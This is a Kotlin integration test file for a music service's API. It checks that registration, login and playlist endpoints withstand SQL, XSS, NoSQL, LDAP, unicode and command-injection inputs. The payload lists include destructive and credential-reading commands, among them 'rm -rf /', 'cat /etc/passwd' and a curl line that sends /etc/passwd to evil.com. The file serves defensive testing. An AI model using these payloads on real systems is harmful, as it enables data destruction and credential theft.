package com.musify.security

import com.musify.testModule
import com.musify.utils.BaseIntegrationTest
import io.ktor.client.request.*
import io.ktor.client.statement.*
import io.ktor.http.*
import io.ktor.server.testing.*
import kotlinx.serialization.json.*
import org.junit.jupiter.api.Test
import kotlin.test.assertEquals
import kotlin.test.assertNotEquals

class InputSanitizationTest : BaseIntegrationTest() {
    
    private val json = Json { ignoreUnknownKeys = true }
    
    private suspend fun getAuthToken(client: io.ktor.client.HttpClient, username: String = "testuser"): String {
        val registerRequest = """
            {
                "email": "$username@example.com",
                "username": "$username",
                "password": "password123",
                "displayName": "Test User"
            }
        """.trimIndent()
        
        val registerResponse = client.post("/api/auth/register") {
            contentType(ContentType.Application.Json)
            setBody(registerRequest)
        }
        
        val registerBody = json.parseToJsonElement(registerResponse.bodyAsText()).jsonObject
        return registerBody["token"]?.jsonPrimitive?.content!!
    }
    
    @Test
    fun `should prevent SQL injection in registration`() {
        testApplication {
            application {
                testModule()
            }
            
            val sqlInjectionPayloads = listOf(
                "'; DROP TABLE users; --",
                "admin'; INSERT INTO users (username) VALUES ('hacker'); --",
                "' UNION SELECT * FROM users --",
                "' OR 1=1 --",
                "admin'/**/OR/**/1=1#",
                "'; EXEC xp_cmdshell('whoami'); --"
            )
            
            for (payload in sqlInjectionPayloads) {
                val registerRequest = """
                    {
                        "email": "test@example.com",
                        "username": "$payload",
                        "password": "password123",
                        "displayName": "Test User"
                    }
                """.trimIndent()
                
                val response = client.post("/api/auth/register") {
                    contentType(ContentType.Application.Json)
                    setBody(registerRequest)
                }
                
                // Should return validation error or rate limit, not crash
                assert(
                    response.status == HttpStatusCode.BadRequest || 
                    response.status == HttpStatusCode.TooManyRequests
                ) {
                    "Should safely handle SQL injection in username: $payload. Got: ${response.status}"
                }
            }
        }
    }
    
    @Test
    fun `should prevent XSS in playlist creation`() {
        testApplication {
            application {
                testModule()
            }
            
            val token = getAuthToken(client, "xsstest")
            
            val xssPayloads = listOf(
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "';alert('XSS');//",
                "<svg onload=alert('XSS')>",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "%3Cscript%3Ealert('XSS')%3C/script%3E"
            )
            
            for (payload in xssPayloads) {
                val createRequest = """
                    {
                        "name": "$payload",
                        "description": "Test playlist with XSS attempt",
                        "isPublic": true
                    }
                """.trimIndent()
                
                val response = client.post("/api/playlists") {
                    header(HttpHeaders.Authorization, "Bearer $token")
                    contentType(ContentType.Application.Json)
                    setBody(createRequest)
                }
                
                // Should either reject or sanitize the input
                // If it accepts, the response should not contain the raw script
                if (response.status == HttpStatusCode.Created) {
                    val responseBody = response.bodyAsText()
                    assertEquals(false, responseBody.contains("<script>", ignoreCase = true),
                        "Response should not contain unsanitized script tags")
                    assertEquals(false, responseBody.contains("javascript:", ignoreCase = true),
                        "Response should not contain javascript: protocol")
                }
            }
        }
    }
    
    @Test
    fun `should handle extremely long input strings`() {
        testApplication {
            application {
                testModule()
            }
            
            val token = getAuthToken(client, "longtest")
            
            // Create very long strings to test buffer overflow protection
            val veryLongString = "A".repeat(10000)
            val extremelyLongString = "B".repeat(100000)
            
            val longInputTests = listOf(
                veryLongString,
                extremelyLongString
            )
            
            for (longInput in longInputTests) {
                val createRequest = """
                    {
                        "name": "$longInput",
                        "description": "Test with long input",
                        "isPublic": true
                    }
                """.trimIndent()
                
                val response = client.post("/api/playlists") {
                    header(HttpHeaders.Authorization, "Bearer $token")
                    contentType(ContentType.Application.Json)
                    setBody(createRequest)
                }
                
                // Should either reject or truncate, not crash
                assertNotEquals(HttpStatusCode.InternalServerError, response.status,
                    "Should handle long input gracefully, length: ${longInput.length}")
            }
        }
    }
    
    @Test
    fun `should prevent NoSQL injection attempts`() {
        testApplication {
            application {
                testModule()
            }
            
            val noSqlInjectionPayloads = listOf(
                "{\$ne: null}",
                "{\$gt: ''}",
                "{\$where: 'this.password.match(/.*/)'}",
                "{\$regex: '.*'}",
                "'; return db.users.find(); var dummy='",
                "admin'; return true; var dummy='"
            )
            
            for (payload in noSqlInjectionPayloads) {
                val loginRequest = """
                    {
                        "username": "$payload",
                        "password": "password"
                    }
                """.trimIndent()
                
                val response = client.post("/api/auth/login") {
                    contentType(ContentType.Application.Json)
                    setBody(loginRequest)
                }
                
                assert(
                    response.status == HttpStatusCode.Unauthorized || 
                    response.status == HttpStatusCode.TooManyRequests
                ) {
                    "Should prevent NoSQL injection: $payload. Got: ${response.status}"
                }
            }
        }
    }
    
    @Test
    fun `should prevent command injection in file operations`() {
        testApplication {
            application {
                testModule()
            }
            
            val token = getAuthToken(client, "cmdtest")
            
            val commandInjectionPayloads = listOf(
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& whoami",
                "; ls -la",
                "`whoami`",
                "\$(whoami)",
                "; curl http://evil.com/steal?data=\$(cat /etc/passwd)"
            )
            
            for (payload in commandInjectionPayloads) {
                // Test in playlist name (could be used in file operations)
                val createRequest = """
                    {
                        "name": "playlist$payload",
                        "description": "Test command injection",
                        "isPublic": true
                    }
                """.trimIndent()
                
                val response = client.post("/api/playlists") {
                    header(HttpHeaders.Authorization, "Bearer $token")
                    contentType(ContentType.Application.Json)
                    setBody(createRequest)
                }
                
                // Should handle safely without executing commands
                assertNotEquals(HttpStatusCode.InternalServerError, response.status,
                    "Should prevent command injection: $payload")
            }
        }
    }
    
    @Test
    fun `should handle unicode and special character attacks`() {
        testApplication {
            application {
                testModule()
            }
            
            getAuthToken(client, "unicodetest") // Token not needed for registration tests
            
            val unicodeAttacks = listOf(
                "admin\u0000", // Null byte injection
                "admin\u000A", // Line feed injection
                "admin\u000D", // Carriage return injection
                "admin\u0020", // Space injection
                "admin\uFEFF", // Zero width no-break space
                "admin\u200B", // Zero width space
                "\uD83D\uDE08\uD83D\uDC80", // Emoji that might break parsing
                "admin\u0001\u0002\u0003", // Control characters
                "admin\u202E", // Right-to-left override (homograph attack)
            )
            
            for (attack in unicodeAttacks) {
                val registerRequest = """
                    {
                        "email": "unicode@example.com",
                        "username": "$attack",
                        "password": "password123",
                        "displayName": "Unicode Test"
                    }
                """.trimIndent()
                
                val response = client.post("/api/auth/register") {
                    contentType(ContentType.Application.Json)
                    setBody(registerRequest)
                }
                
                // Should either reject or sanitize, not crash
                assertNotEquals(HttpStatusCode.InternalServerError, response.status,
                    "Should handle unicode attack safely: ${attack.codePoints().toArray().contentToString()}")
            }
        }
    }
    
    @Test
    fun `should prevent LDAP injection`() {
        testApplication {
            application {
                testModule()
            }
            
            val ldapInjectionPayloads = listOf(
                "admin)(&(password=*))",
                "admin)(|(password=*))",
                "*)(uid=*)",
                "admin)(!(&(password=*)))",
                ")(cn=*",
                "admin*",
                "admin)(objectClass=*"
            )
            
            for (payload in ldapInjectionPayloads) {
                val loginRequest = """
                    {
                        "username": "$payload",
                        "password": "password"
                    }
                """.trimIndent()
                
                val response = client.post("/api/auth/login") {
                    contentType(ContentType.Application.Json)
                    setBody(loginRequest)
                }
                
                assert(
                    response.status == HttpStatusCode.Unauthorized || 
                    response.status == HttpStatusCode.TooManyRequests
                ) {
                    "Should prevent LDAP injection: $payload. Got: ${response.status}"
                }
            }
        }
    }
    
    @Test
    fun `should validate email format strictly`() {
        testApplication {
            application {
                testModule()
            }
            
            val invalidEmails = listOf(
                "plainaddress",
                "@missingdomain.com",
                "missing@.com",
                "missing@domain",
                "missing.domain@.com",
                "two@@domain.com",
                "domain@domain@domain.com",
                "<script>alert('xss')</script>@domain.com",
                "test@domain.com<script>alert('xss')</script>",
                "test+<script>@domain.com"
            )
            
            for (email in invalidEmails) {
                val registerRequest = """
                    {
                        "email": "$email",
                        "username": "testuser",
                        "password": "password123",
                        "displayName": "Test User"
                    }
                """.trimIndent()
                
                val response = client.post("/api/auth/register") {
                    contentType(ContentType.Application.Json)
                    setBody(registerRequest)
                }
                
                assert(
                    response.status == HttpStatusCode.BadRequest || 
                    response.status == HttpStatusCode.TooManyRequests
                ) {
                    "Should reject invalid email: $email. Got: ${response.status}"
                }
            }
        }
    }
}